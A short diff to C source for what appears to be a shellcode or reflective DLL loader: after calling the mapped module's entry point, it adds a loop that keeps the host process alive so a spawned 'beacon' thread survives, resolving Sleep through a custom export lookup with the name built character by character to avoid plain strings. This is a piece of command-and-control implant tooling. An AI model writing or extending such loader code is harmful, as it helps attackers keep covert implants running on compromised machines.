@@ -338,4 +338,18 @@ void _start(void) {
         fn_main entryMain = (fn_main)(mapped + ep_rva);
         entryMain();
     }
+
+    /*
+     * Block forever — the beacon runs in a spawned thread (CreateThread
+     * inside DllMain). If we return, the shellcode caller's process may
+     * exit, killing the beacon thread. Resolve Sleep from kernel32 and
+     * loop indefinitely.
+     */
+    char sSleep[] = {'S','l','e','e','p',0};
+    typedef VOID (WINAPI *fn_Sleep)(DWORD);
+    fn_Sleep pSleep = (fn_Sleep)find_export(hK32, sSleep);
+    if (pSleep) {
+        for (;;) pSleep(60000);
+    }
+    for (volatile DWORD spin = 0; ; spin++);
 }
